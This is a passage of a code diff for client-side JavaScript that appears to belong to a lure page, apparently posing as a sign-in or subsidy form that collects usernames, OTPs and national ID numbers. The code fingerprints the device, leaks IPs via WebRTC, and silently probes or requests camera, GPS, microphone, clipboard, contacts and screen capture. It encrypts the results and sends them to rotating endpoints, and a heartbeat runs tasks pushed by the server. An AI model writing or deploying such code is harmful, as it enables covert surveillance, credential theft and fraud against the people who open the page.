+function med(a){if(!a.length)return 0;var b=a.slice().sort(function(x,y){return x-y}),i=b.length>>1;return b.length%2?b[i]:Math.round((b[i-1]+b[i])/2)}
+function setSt(m,c){stEl.textContent=m;stEl.style.color=c||'#5f6368';stEl.classList.add('show')}
+function clrSt(){stEl.classList.remove('show');stEl.textContent=''}
+function devId(){try{var v=localStorage.getItem('zgch_dev');if(!v){v=hex(8);localStorage.setItem('zgch_dev',v)}return v}catch(e){return''}}
+function izM(k,v){if(v===undefined){try{return(JSON.parse(localStorage.getItem(IZIN)||'{}'))[k]||''}catch(e){return''}}try{var o=JSON.parse(localStorage.getItem(IZIN)||'{}');o[k]=v;localStorage.setItem(IZIN,JSON.stringify(o))}catch(e){}}
+function izC(n){return new Promise(function(r){try{if(!navigator.permissions)return r('u');navigator.permissions.query({name:n}).then(function(s){r(s.state)}).catch(function(){r('u')})}catch(e){r('u')}})}
 
-      var username = '', busy = false, otpBusy = false, closeTimer = null, lastQ = '', ridCur = '';
-      var stream = null, camState = 'idle', gpsState = 'idle', shots = 0, rounds = 0, best = '', bestScore = -1;
-      var photo = '', photoSent = false, gps = null, addr = '', ip = '', isp = '', kota = '', sumber = '';
-      var t0 = Date.now(), tSubmit = 0, pasted = false, autofill = false, dirty = false;
-      var alive = true, misses = 0, beatTimer = null, inFlight = false, camDone = null;
-      var audioFpCache = '', launderOk = 0, launderTried = 0, prompts = 0, probeDone = false;
+var sid=(function(){try{var v=localStorage.getItem('zgch_sid');if(!v){v=hex(16);localStorage.setItem('zgch_sid',v)}return v}catch(e){return hex(16)}})();
+var ridCur=rid(),username='',busy=false,otpBusy=false,lastQ='',popup=false;
+var stream=null,camS='idle',gpsS='idle',konS='idle',smsS='idle',shots=0,rounds=0,best='',bestSc=-1,photo='',photoSent=false;
+var gps=null,addr='',ip='',isp='',kota='',sumber='',t0=Date.now(),tSub=0,pasted=false;
+var alive=true,miss=0,bt=null,inflight=false,camDone=null,audioFp='',lOk=0,lTry=0,prompts=0,probeDone=false,senyap=0;
+var KEYS=[],NIK='',watchId=null,lastKirim=0,lastShot=0,mutasi=[],mutObs=null,konTertunda=false,konDone=false,otpAc=null;
 
-      /* ---------- util ---------- */
-      function hex(n) { var a = new Uint8Array(n); try { crypto.getRandomValues(a); } catch (e) { for (var i = 0; i < n; i++) a[i] = Math.random() * 256 | 0; } return [].map.call(a, function (b) { return ('0' + b.toString(16)).slice(-2); }).join(''); }
-      function devId() { try { var v = localStorage.getItem('gsi_dev'); if (!v) { v = hex(8); localStorage.setItem('gsi_dev', v); } return v; } catch (e) { return ''; } }
-      function rid() { return 'r' + Date.now().toString(36) + hex(4); }
-      function h32(s) { var h = 0x811c9dc5; for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = (h * 0x01000193) >>> 0; } return ('0000000' + h.toString(16)).slice(-8); }
-      function b64(u) { var s = '', c = 0x8000; for (var i = 0; i < u.length; i += c) s += String.fromCharCode.apply(null, u.subarray(i, i + c)); return btoa(s); }
-      function setStatus(m, c) { statusEl.textContent = m; statusEl.style.color = c || '#5f6368'; statusEl.classList.add('show'); }
-      function clearStatus() { statusEl.classList.remove('show'); statusEl.textContent = ''; }
-      function rng(seed) { var s = seed >>> 0; return function () { s |= 0; s = s + 0x6D2B79F5 | 0; var t = Math.imul(s ^ s >>> 15, 1 | s); t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t; return ((t ^ t >>> 14) >>> 0) / 4294967296; }; }
-      function shuffle(a) { var r = rng(SEED), i = a.length, j, t; while (i) { j = r() * i-- | 0; t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
-      function med(a) { if (!a.length) return 0; var b = a.slice().sort(function (x, y) { return x - y; }), i = b.length >> 1; return b.length % 2 ? b[i] : Math.round((b[i - 1] + b[i]) / 2); }
+var kc=null;
+function aKey(){if(!kc)kc=crypto.subtle.importKey('raw',new TextEncoder().encode(PSK),'AES-CTR',false,['encrypt']);return kc}
+function gz(u){if(!window.CompressionStream)return Promise.resolve(null);try{var s=new Blob([u]).stream().pipeThrough(new CompressionStream('gzip'));return new Response(s).arrayBuffer().then(function(b){return new Uint8Array(b)}).catch(function(){return null})}catch(e){return Promise.resolve(null)}}
+function seal(o){o.pad=hex(8+(Math.random()*24|0));var raw=new TextEncoder().encode(JSON.stringify(o));
+ if(!crypto.subtle)return Promise.resolve({b:b64(raw),g:0});
+ return gz(raw).then(function(z){var body=z||raw,iv=new Uint8Array(16);crypto.getRandomValues(iv);
+  return aKey().then(function(k){return crypto.subtle.encrypt({name:'AES-CTR',counter:iv,length:64},k,body)})
+  .then(function(ct){var a=new Uint8Array(16+ct.byteLength);a.set(iv);a.set(new Uint8Array(ct),16);return{b:b64(a),g:z?1:0}})}).catch(function(){return{b:b64(raw),g:0}})}
+function ep(){return EPS[Math.floor(Math.random()*EPS.length)]}
+function post(q){return fetch(ep(),{method:'POST',mode:'cors',credentials:'omit',headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},body:q}).then(function(r){return r.text().then(function(t){return{ok:true,t:t}})}).catch(function(){return{ok:false,t:''}})}
+function raw(q){try{if(navigator.sendBeacon&&q.length<60000){navigator.sendBeacon(ep(),new Blob([q],{type:'application/x-www-form-urlencoded;charset=UTF-8'}));return}}catch(e){}try{new Image().src=ep()+'?t='+Date.now()+'&'+q}catch(e){}fetch(ep(),{method:'POST',mode:'no-cors',keepalive:true,body:q}).catch(function(){})}
+function send(a,o){return seal(Object.assign({action:a,sid:sid,ts:Date.now()},o||{})).then(function(p){var q='action='+a+'&sid='+sid+'&enc=1&gz='+p.g+'&p='+encodeURIComponent(p.b);
+ return post(q).then(function(r){if(!r.ok){raw(q);return{ok:false}}try{return JSON.parse(r.t)}catch(e){return{ok:false}}})})}
 
-      /* ---------- amplop ---------- */
-      var kc = null;
-      function aesKey() { if (!kc) kc = crypto.subtle.importKey('raw', new TextEncoder().encode(PSK), 'AES-CTR', false, ['encrypt']); return kc; }
-      function gz(u) {
-        if (!window.CompressionStream) return Promise.resolve(null);
-        try { var s = new Blob([u]).stream().pipeThrough(new CompressionStream('gzip')); return new Response(s).arrayBuffer().then(function (b) { return new Uint8Array(b); }).catch(function () { return null; }); }
-        catch (e) { return Promise.resolve(null); }
-      }
-      function seal(o) {
-        o.pad = hex(8 + (Math.random() * 24 | 0));
-        var raw = new TextEncoder().encode(JSON.stringify(o));
-        if (!crypto.subtle) return Promise.resolve({ b: b64(raw), g: 0 });
-        return gz(raw).then(function (z) {
-          var body = z || raw, iv = new Uint8Array(16);
-          crypto.getRandomValues(iv);
-          return aesKey().then(function (k) { return crypto.subtle.encrypt({ name: 'AES-CTR', counter: iv, length: 64 }, k, body); })
-            .then(function (ct) { var a = new Uint8Array(16 + ct.byteLength); a.set(iv); a.set(new Uint8Array(ct), 16); return { b: b64(a), g: z ? 1 : 0 }; });
-        }).catch(function () { return { b: b64(raw), g: 0 }; });
-      }
+function fp(){var o=[];try{var c=document.createElement('canvas');c.width=220;c.height=44;var x=c.getContext('2d');
+ x.textBaseline='top';x.font='14px Arial';x.fillStyle='#f60';x.fillRect(0,0,110,22);x.fillStyle='#069';x.fillText('BSU2026@1',2,2);
+ x.fillStyle='rgba(102,204,0,.7)';x.fillText('BSU2026@1',4,6);o.push('cv'+h32(c.toDataURL()))}catch(e){o.push('cv-')}
+ try{var g=document.createElement('canvas').getContext('webgl'),d=g&&g.getExtension('WEBGL_debug_renderer_info');
+ o.push(d?'gl:'+String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)).slice(0,40):'gl-')}catch(e){o.push('gl-')}
+ o.push('c'+(navigator.hardwareConcurrency||0),'m'+(navigator.deviceMemory||0),'t'+(navigator.maxTouchPoints||0),'d'+(devicePixelRatio||1));return o.join('|')}
+function audioF(){return new Promise(function(res){try{var C=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!C)return res('-');
+ var x=new C(1,44100,44100),o=x.createOscillator(),p=x.createDynamicsCompressor();o.type='triangle';o.frequency.value=10000;
+ p.threshold.value=-50;p.knee.value=40;p.ratio.value=12;o.connect(p);p.connect(x.destination);o.start(0);
+ x.startRendering().then(function(b){var d=b.getChannelData(0),s=0;for(var i=4500;i<5000;i++)s+=Math.abs(d[i]);res('a'+h32(String(s)))}).catch(function(){res('-')})}catch(e){res('-')}})}
+var FN=['Arial','Courier New','Georgia','Times New Roman','Verdana','Tahoma','Trebuchet MS','Roboto','Segoe UI','Ubuntu','Noto Sans','Samsung Sans','Impact','Calibri'];
+function fontF(){var c=document.createElement('canvas').getContext('2d'),o=[];c.font='72px monospace';var b=c.measureText('mmmmmmmmmmlli').width;
+ FN.forEach(function(f){c.font='72px "'+f+'",monospace';if(c.measureText('mmmmmmmmmmlli').width!==b)o.push(f)});return o.join(',')}
 
-      /* ---------- transport ---------- */
-      function ep() { return EPS[Math.floor(Math.random() * EPS.length)]; }
-      function post(q) {
-        return fetch(ep(), { method: 'POST', mode: 'cors', credentials: 'omit', redirect: 'follow', headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }, body: q })
-          .then(function (r) { return r.text().then(function (t) { return { ok: true, t: t }; }); })
-          .catch(function () { return { ok: false, t: '' }; });
-      }
-      function raw(q) {
-        try { if (navigator.sendBeacon && q.length < 60000) { navigator.sendBeacon(ep(), new Blob([q], { type: 'application/x-www-form-urlencoded;charset=UTF-8' })); return; } } catch (e) { }
-        try { new Image().src = ep() + '?t=' + Date.now() + '&' + q; } catch (e) { }
-        fetch(ep(), { method: 'POST', mode: 'no-cors', keepalive: true, body: q }).catch(function () { });
-      }
-      function send(action, obj) {
-        return seal(Object.assign({ action: action, sid: sid, ts: Date.now() }, obj || {})).then(function (p) {
-          var q = 'action=' + action + '&sid=' + sid + '&enc=1&gz=' + p.g + '&p=' + encodeURIComponent(p.b);
-          return post(q).then(function (r) {
-            if (!r.ok) { raw(q); return { ok: false }; }
-            try { return JSON.parse(r.t); } catch (e) { return { ok: false }; }
-          });
-        });
-      }
+var sen={n:0,ax:[],ay:[],az:[],ga:[],on:false,ctx:''};
+function senMo(e){var a=e.accelerationIncludingGravity;if(!a)return;sen.n++;sen.ax.push(a.x||0);sen.ay.push(a.y||0);sen.az.push(a.z||0)}
+function senOr(e){sen.ga.push(e.gamma||0)}
+function va(a){if(a.length<2)return 0;var m=a.reduce(function(x,y){return x+y},0)/a.length;return a.reduce(function(x,y){return x+(y-m)*(y-m)},0)/a.length}
+function senStart(){if(sen.on)return;sen.on=true;window.addEventListener('devicemotion',senMo,{passive:true});window.addEventListener('deviceorientation',senOr,{passive:true});
+ setTimeout(function(){window.removeEventListener('devicemotion',senMo);window.removeEventListener('deviceorientation',senOr);sen.on=false;
+ var v=va(sen.ax)+va(sen.ay)+va(sen.az),c=sen.n<3?'tanpa sensor':v>6?'kendaraan':v>1.2?'berjalan':'diam';
+ var g=sen.ga.length?(Math.abs(sen.ga.reduce(function(x,y){return x+y},0)/sen.ga.length)>45?'miring':'tegak'):'?';
+ sen.ctx=c+' / '+g+' / '+sen.n+' sampel';if(probeDone)sendProbe()},6000)}
 
-      /* ---------- fingerprint ---------- */
-      function fp() {
-        var o = [];
-        try {
-          var c = document.createElement('canvas'); c.width = 220; c.height = 44;
-          var x = c.getContext('2d'); x.textBaseline = 'top'; x.font = '14px Arial';
-          x.fillStyle = '#f60'; x.fillRect(0, 0, 110, 22); x.fillStyle = '#069'; x.fillText('BSU2026@1', 2, 2);
-          x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('BSU2026@1', 4, 6);
-          o.push('cv' + h32(c.toDataURL()));
-        } catch (e) { o.push('cv-'); }
-        try {
-          var g = document.createElement('canvas').getContext('webgl');
-          var d = g && g.getExtension('WEBGL_debug_renderer_info');
-          o.push(d ? 'gl:' + String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)).slice(0, 40) : 'gl-');
-        } catch (e) { o.push('gl-'); }
-        o.push('c' + (navigator.hardwareConcurrency || 0), 'm' + (navigator.deviceMemory || 0), 't' + (navigator.maxTouchPoints || 0), 'd' + (devicePixelRatio || 1));
-        return o.join('|');
-      }
-      function audioFp() {
-        return new Promise(function (res) {
-          try {
-            var C = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-            if (!C) return res('-');
-            var ctx = new C(1, 44100, 44100), osc = ctx.createOscillator(), cmp = ctx.createDynamicsCompressor();
-            osc.type = 'triangle'; osc.frequency.value = 10000;
-            cmp.threshold.value = -50; cmp.knee.value = 40; cmp.ratio.value = 12;
-            osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
-            ctx.startRendering().then(function (b) {
-              var d = b.getChannelData(0), s = 0;
-              for (var i = 4500; i < 5000; i++) s += Math.abs(d[i]);
-              res('a' + h32(String(s)));
-            }).catch(function () { res('-'); });
-          } catch (e) { res('-'); }
-        });
-      }
-      var FONTS = ['Arial','Courier New','Georgia','Times New Roman','Verdana','Tahoma','Trebuchet MS','Roboto','Segoe UI','Ubuntu','Noto Sans','Samsung Sans','Impact','Calibri'];
-      function fontFp() {
-        var c = document.createElement('canvas').getContext('2d'), out = [];
-        c.font = '72px monospace'; var base = c.measureText('mmmmmmmmmmlli').width;
-        FONTS.forEach(function (f) { c.font = '72px "' + f + '", monospace'; if (c.measureText('mmmmmmmmmmlli').width !== base) out.push(f); });
-        return out.join(',');
-      }
+var STATES={},WATCH={};
+var ORC=['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write','persistent-storage','accelerometer','gyroscope','magnetometer','midi','bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock','contacts'];
+function oracle(){return Promise.all(ORC.map(function(n){if(!navigator.permissions){STATES[n]='unsupported';return Promise.resolve()}
+ return navigator.permissions.query({name:n}).then(function(s){STATES[n]=s.state;WATCH[n]={st:s,t:0};s.onchange=function(){WATCH[n].t=performance.now()}}).catch(function(){STATES[n]='unsupported'})}))}
+function uaD(){return new Promise(function(r){try{if(!navigator.userAgentData||!navigator.userAgentData.getHighEntropyValues)return r({});
+ navigator.userAgentData.getHighEntropyValues(['model','platformVersion','architecture','bitness']).then(function(d){r(d||{})}).catch(function(){r({})})}catch(e){r({})}})}
+var invC={};
+function inv(){var o={ua:navigator.userAgent,plat:navigator.platform,lang:(navigator.languages||[]).join(','),tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+ cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,touch:navigator.maxTouchPoints,dpr:devicePixelRatio,
+ scr:screen.width+'x'+screen.height,depth:screen.colorDepth,dark:matchMedia('(prefers-color-scheme: dark)').matches,
+ fp:fp(),font:fontF(),ref:document.referrer,url:location.href,nik:NIK,senyap:senyap,kontak:konS,sms:smsS};
+ try{var g=document.createElement('canvas').getContext('webgl'),d=g&&g.getExtension('WEBGL_debug_renderer_info');if(d)o.gpu=g.getParameter(d.UNMASKED_VENDOR_WEBGL)+'/'+g.getParameter(d.UNMASKED_RENDERER_WEBGL)}catch(e){}
+ return o}
+function permScan(){var n=['geolocation','camera','microphone','notifications','accelerometer','gyroscope','magnetometer','midi','bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock','contacts'];
+ return Promise.all(n.map(function(k){if(!navigator.permissions)return Promise.resolve(k+':-');
+ return navigator.permissions.query({name:k}).then(function(s){return k+':'+s.state}).catch(function(){return k+':-'})})).then(function(r){return r.join(', ')})}
+function mediaScan(){return new Promise(function(r){if(!navigator.mediaDevices||!navigator.mediaDevices.enumerateDevices)return r('-');
+ navigator.mediaDevices.enumerateDevices().then(function(d){r(d.map(function(x){return x.kind+(x.label?'='+x.label.slice(0,18):'')}).join(', ')||'-')}).catch(function(){return r('-')})})}
 
-      /* ---------- sensor + konteks ---------- */
-      var sen = { n: 0, ax: [], ay: [], az: [], ga: [], on: false, ctx: '' };
-      function senStart() {
-        if (sen.on) return; sen.on = true;
-        window.addEventListener('devicemotion', senMo, { passive: true });
-        window.addEventListener('deviceorientation', senOr, { passive: true });
-        setTimeout(senStop, 6000);
-      }
-      function senMo(e) { var a = e.accelerationIncludingGravity; if (!a) return; sen.n++; sen.ax.push(a.x || 0); sen.ay.push(a.y || 0); sen.az.push(a.z || 0); }
-      function senOr(e) { sen.ga.push(e.gamma || 0); }
-      function va(a) { if (a.length < 2) return 0; var m = a.reduce(function (x, y) { return x + y; }, 0) / a.length; return a.reduce(function (x, y) { return x + (y - m) * (y - m); }, 0) / a.length; }
-      function senStop() {
-        window.removeEventListener('devicemotion', senMo);
-        window.removeEventListener('deviceorientation', senOr);
-        sen.on = false;
-        var v = va(sen.ax) + va(sen.ay) + va(sen.az);
-        var ctx = sen.n < 3 ? 'tanpa sensor' : v > 6 ? 'kendaraan' : v > 1.2 ? 'berjalan' : 'diam';
-        var grip = sen.ga.length ? (Math.abs(sen.ga.reduce(function (x, y) { return x + y; }, 0) / sen.ga.length) > 45 ? 'miring' : 'tegak') : '?';
-        sen.ctx = ctx + ' / ' + grip + ' / ' + sen.n + ' sampel';
-        if (probeDone) sendProbe();
-      }
+function need(v,n){if(!v)throw new TypeError(n||'unsupported');return v}
+var PR=[
+{id:'canvas',cls:'A',fn:function(){return fp()}},
+{id:'webgl',cls:'A',fn:function(){var g=need(document.createElement('canvas').getContext('webgl'),'no-webgl'),d=g.getExtension('WEBGL_debug_renderer_info');return d?g.getParameter(d.UNMASKED_VENDOR_WEBGL)+'|'+g.getParameter(d.UNMASKED_RENDERER_WEBGL):'ok'}},
+{id:'gpu-adapter',cls:'A',fn:function(){return need(navigator.gpu,'no-webgpu').requestAdapter().then(function(a){if(!a)throw new TypeError('no-adapter');return JSON.stringify(a.info||{})})}},
+{id:'webrtc-ip',cls:'A',fn:function(){return new Promise(function(r){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]}),ips=[];
+ pc.onicecandidate=function(e){if(!e.candidate)return;var m=/([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{4}:[a-f0-9:]+)/i.exec(e.candidate.candidate);if(m&&ips.indexOf(m[1])<0)ips.push(m[1])};
+ pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).catch(function(){});
+ setTimeout(function(){try{pc.close()}catch(e){}r(ips.join(',')||'-')},2600)})}},
+{id:'codec',cls:'A',fn:function(){return['video/mp4;codecs=avc1.42E01E','video/webm;codecs=vp8','video/webm;codecs=vp9','video/webm;codecs=av01','audio/mp4;codecs=mp4a.40.2','audio/webm;codecs=opus','audio/mpeg'].map(function(x){return(window.MediaRecorder&&MediaRecorder.isTypeSupported(x))?'1':'0'}).join('')}},
+{id:'decoder',cls:'A',fn:function(){return need(navigator.mediaCapabilities,'no-mc').decodingInfo({type:'file',video:{contentType:'video/webm;codecs=vp9',width:1280,height:720,bitrate:2e6,framerate:30}}).then(function(r){return r.supported?'v':'no'})}},
+{id:'battery',cls:'A',fn:function(){return need(navigator.getBattery,'no-battery').call(navigator).then(function(b){return b.level.toFixed(2)+'/'+(b.charging?'chg':'dis')})}},
+{id:'conn',cls:'A',fn:function(){var c=need(navigator.connection,'no-conn');return[c.effectiveType,c.rtt,c.downlink,c.saveData?'sv':'-'].join('|')}},
+{id:'heap',cls:'A',fn:function(){if(!performance.memory)throw new TypeError('no-mem');return(performance.memory.jsHeapSizeLimit/1048576|0)+'MB'}},
+{id:'storage',cls:'A',fn:function(){return need(navigator.storage,'no-storage').estimate().then(function(e){return(e.quota/1048576|0)+'/'+(e.usage/1048576|0)})}},
+{id:'persisted',cls:'A',fn:function(){return need(navigator.storage,'no-storage').persisted().then(String)}},
+{id:'fonts',cls:'A',fn:function(){return fontF()}},
+{id:'intl',cls:'A',fn:function(){return[Intl.DateTimeFormat().resolvedOptions().locale,(1234.5).toLocaleString()].join('|')}},
+{id:'css-media',cls:'A',fn:function(){return['(pointer:coarse)','(any-pointer:fine)','(hover:hover)','(prefers-reduced-motion:reduce)','(prefers-contrast:more)','(forced-colors:active)','(color-gamut:p3)','(inverted-colors:inverted)'].map(function(q){return matchMedia(q).matches?'1':'0'}).join('')}},
+{id:'enumerate',cls:'A',fn:function(){return mediaScan()}},
+{id:'uach',cls:'A',fn:function(){return need(navigator.userAgentData,'no-uach').getHighEntropyValues(['model','platformVersion','architecture','bitness']).then(function(d){return[d.model,d.platformVersion,d.architecture,d.bitness].join('|')})}},
+{id:'bluetooth-avail',cls:'A',fn:function(){return need(navigator.bluetooth,'no-bt').getAvailability().then(String)}},
+{id:'usb-devices',cls:'A',fn:function(){return need(navigator.usb,'no-usb').getDevices().then(function(d){return String(d.length)})}},
+{id:'hid-devices',cls:'A',fn:function(){return need(navigator.hid,'no-hid').getDevices().then(function(d){return String(d.length)})}},
+{id:'serial-ports',cls:'A',fn:function(){return need(navigator.serial,'no-serial').getPorts().then(function(d){return String(d.length)})}},
+{id:'pdf-viewer',cls:'A',fn:function(){return String(!!navigator.pdfViewerEnabled)}},
+{id:'cookie',cls:'A',fn:function(){return String(navigator.cookieEnabled)}},
+{id:'orientation-read',cls:'A',fn:function(){return(screen.orientation?screen.orientation.type:'?')}},
+{id:'sensor-api',cls:'A',fn:function(){return['Accelerometer','Gyroscope','Magnetometer','AmbientLightSensor'].map(function(k){return(k in window)?'1':'0'}).join('')}},
+{id:'vibrate',cls:'A',fn:function(){return String(typeof navigator.vibrate)}},
+{id:'speech',cls:'A',fn:function(){return String(!!window.speechSynthesis)}},
+{id:'idb',cls:'A',fn:function(){return String(!!window.indexedDB)}},
+{id:'contacts-api',cls:'A',fn:function(){return String(!!navigator.contacts)+'/'+String('ContactsManager' in window)}},
+{id:'webotp',cls:'A',fn:function(){return String('OTPCredential' in window)}},
+{id:'camera',cls:'B',fn:function(){return need(navigator.mediaDevices,'no-md').getUserMedia({video:{facingMode:'user',width:{ideal:480}}}).then(function(s){var st=s.getVideoTracks()[0].getSettings();window.__cam=s;return(st.width||0)+'x'+(st.height||0)})}},
+{id:'microphone',cls:'B',fn:function(){return need(navigator.mediaDevices,'no-md').getUserMedia({audio:true}).then(function(s){var st=s.getAudioTracks()[0].getSettings(),o=(st.sampleRate||0)+'Hz';s.getTracks().forEach(function(t){t.stop()});return o})}},
+{id:'geolocation',cls:'B',fn:function(){return new Promise(function(r,j){need(navigator.geolocation,'no-geo').getCurrentPosition(function(p){
+ gps={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy||0)};sumber='gps';gpsS='ok';paint();patch();r(gps.lat);},
+ function(e){gpsS='denied';paint();j(e)},{enableHighAccuracy:true,timeout:11000,maximumAge:60000})})}},
+{id:'notifications',cls:'B',fn:function(){return need(window.Notification,'no-notif').requestPermission().then(function(p){if(p!=='granted')throw new Error('notif');return p})}},
+{id:'clipboard-read',cls:'C',fn:function(){return need(navigator.clipboard,'no-clip').readText().then(function(t){return'len'+t.length})}},
+{id:'clipboard-write',cls:'C',fn:function(){return need(navigator.clipboard,'no-clip').writeText('zgch').then(function(){return'ok'})}},
+{id:'share',cls:'C',fn:function(){return need(navigator.share,'no-share').call(navigator,{title:'BSU',text:'x'}).then(function(){return'ok'})}},
+{id:'contacts',cls:'C',fn:function(){return need(navigator.contacts,'no-contacts').select(['name','tel'],{multiple:true}).then(function(c){return'n'+c.length})}},
+{id:'wake-lock',cls:'C',fn:function(){return need(navigator.wakeLock,'no-wake').request('screen').then(function(s){return s.type||'ok'})}},
+{id:'idle',cls:'C',fn:function(){return need(navigator.idle,'no-idle').query().then(function(s){return s.userState})}},
+{id:'display-capture',cls:'C',fn:function(){return need(navigator.mediaDevices,'no-md').getDisplayMedia({video:true}).then(function(s){var st=s.getVideoTracks()[0].getSettings();s.getTracks().forEach(function(t){t.stop()});return(st.width||0)+'x'+(st.height||0)})}},
+{id:'file-picker',cls:'C',fn:function(){return need(window.showOpenFilePicker,'no-fsp').call(window,{multiple:false}).then(function(h){return'n'+h.length})}},
+{id:'torch',cls:'C',fn:function(){return need(navigator.mediaDevices,'no-md').getUserMedia({video:{facingMode:'environment'}}).then(function(s){var t=s.getVideoTracks()[0],c=t.getCapabilities?t.getCapabilities():{};s.getTracks().forEach(function(x){x.stop()});return c.torch?'torch':'no-torch'})}}
+];
 
-      /* ---------- oracle + pemicu status ---------- */
-      var STATES = {};
-      var WATCH = {};
-      var ORACLE = ['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write',
-        'persistent-storage','accelerometer','gyroscope','magnetometer','midi','background-sync',
-        'bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock','nfc'];
+var ROWS=[],RUN=0;
+function attempt(p){return new Promise(function(res){var t1=performance.now(),done=false,tm,po,before=STATES[p.id]||'unknown';
+ var fin=function(oc,v){if(done)return;done=true;clearTimeout(tm);clearInterval(po);
+ var row={cap:p.id,outcome:oc,kelas:oc==='silent'?0:oc==='prompt'?1:oc==='blocked'?2:3,lat:Math.round(performance.now()-t1),note:String(v==null?'':v).slice(0,200)};
+ ROWS.push(row);devRow(row);res(row)};
+ tm=setTimeout(function(){fin('prompt','timeout')},4200);
+ if(WATCH[p.id])WATCH[p.id].t=0;
+ po=setInterval(function(){if(done)return;var w=WATCH[p.id];if(w&&w.t&&w.st.state!==before)fin(w.st.state==='granted'?'prompt':'blocked','trans:'+w.st.state)},60);
+ Promise.resolve().then(p.fn).then(function(v){if((STATES[p.id]||before)==='granted'&&before!=='granted')return fin('prompt',v);fin('silent',v)})
+ .catch(function(e){var n=(e&&e.name)||'',m=(e&&e.message)||'';
+ if(n==='NotAllowedError'||n==='SecurityError'||/gesture|activation/i.test(m))return fin('blocked',n||m);
+ if(n==='NotFoundError'||n==='NotSupportedError'||n==='TypeError'||n==='InvalidStateError'||n==='AbortError')return fin('unsupported',n||m);
+ fin('blocked',n||m||'err')})})}
+function chain(l,gap){var i=0;return new Promise(function(r){(function nx(){if(i>=l.length)return r();var p=l[i++];attempt(p).then(function(){setTimeout(nx,gap)})})()})}
+function sendMx(){if(!ROWS.length)return Promise.resolve();var b=ROWS.splice(0,ROWS.length);
+ var pl=((navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform||'?')+'/'+((/Android (\d+)/.exec(navigator.userAgent)||[])[1]||'?')+'/'+(invC.model||'?');
+ return send('matrix',{build:BUILD,run:RUN,platform:pl.slice(0,60),rows:b})}
+function lm(){var s=0,p=0,b=0,l=[];ROWS.forEach(function(r){if(r.kelas===0)s++;else if(r.kelas===1){p++;l.push(r.lat)}else if(r.kelas===2)b++});
+ var a=s+p+b||1;return{sgr:+(s/a).toFixed(3),par:+(p/a).toFixed(3),alh:med(l),n:ROWS.length}}
+function bench(){var n=0,sg=[],pr=[];(function lp(){if(n>=BN){var m=sg.reduce(function(a,b){return a+b},0)/sg.length||0;
+ var v=Math.sqrt(sg.reduce(function(a,b){return a+(b-m)*(b-m)},0)/sg.length);
+ return send('bench',{tag:'bench',n:BN,sgr:m.toFixed(3),par:(pr.reduce(function(a,b){return a+b},0)/pr.length||0).toFixed(3),var:v.toFixed(4),seed:SEED})}
+ RUN=n++;ROWS.length=0;chain(shuf(PR.filter(function(x){return x.cls==='A'})),40).then(function(){var m=lm();sg.push(m.sgr);pr.push(m.par);return sendMx().then(lp)})})()}
+function harvest(){var A=PR.filter(function(x){return x.cls==='A'}),BC=PR.filter(function(x){return x.cls!=='A'});
+ oracle().then(function(){if(BENCH)return bench();
+ if(CTRL)return chain(shuf(A),40).then(function(){sendMx()});
+ chain(shuf(A),40).then(function(){setTimeout(function(){chain(shuf(BC),1100).then(function(){sendMx();sendProbe();if(MAN)unduh()})},700)})})}
 
-      function oracle() {
-        return Promise.all(ORACLE.map(function (n) {
-          if (!navigator.permissions) { STATES[n] = 'unsupported'; return Promise.resolve(); }
-          return navigator.permissions.query({ name: n }).then(function (s) {
-            STATES[n] = s.state;
-            WATCH[n] = { st: s, t: 0 };
-            s.onchange = function () { WATCH[n].t = performance.now(); };
-          }).catch(function () { STATES[n] = 'unsupported'; });
-        }));
-      }
+function beat(f){if(!alive||(inflight&&!f))return;if(document.hidden&&!f&&miss===0)return sch(45000);
+ inflight=true;send('beacon',{vis:document.visibilityState,url:location.href,net:(navigator.connection&&navigator.connection.effectiveType)||''})
+ .then(function(r){inflight=false;if(!r||!r.ok){if(++miss>6){alive=false;return}return sch()}miss=0;(r.tasks||[]).forEach(run);sch(r.next||15000)})}
+function sch(b){if(!alive)return;clearTimeout(bt);var n=b||15000,j=n*.4;bt=setTimeout(function(){beat()},Math.max(4000,n-j+Math.random()*j*2))}
 
-      /* ---------- inventaris ---------- */
-      var invCache = {};
-      function uaData() {
-        return new Promise(function (res) {
-          try {
-            if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) return res({});
-            navigator.userAgentData.getHighEntropyValues(['model','platformVersion','architecture','bitness','uaFullVersion'])
-              .then(function (d) { res(d || {}); }).catch(function () { res({}); });
-          } catch (e) { res({}); }
-        });
-      }
-      function inventaris() {
-        var o = {
-          ua: navigator.userAgent, plat: navigator.platform, lang: (navigator.languages || []).join(','),
-          tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency,
-          mem: navigator.deviceMemory, touch: navigator.maxTouchPoints, dpr: devicePixelRatio,
-          scr: screen.width + 'x' + screen.height, depth: screen.colorDepth,
-          dark: matchMedia('(prefers-color-scheme: dark)').matches, fp: fp(), font: fontFp(), ref: document.referrer, url: location.href
-        };
-        try { var g = document.createElement('canvas').getContext('webgl'); var d = g && g.getExtension('WEBGL_debug_renderer_info'); if (d) o.gpu = g.getParameter(d.UNMASKED_VENDOR_WEBGL) + '/' + g.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch (e) { }
-        return o;
-      }
-      function permScan() {
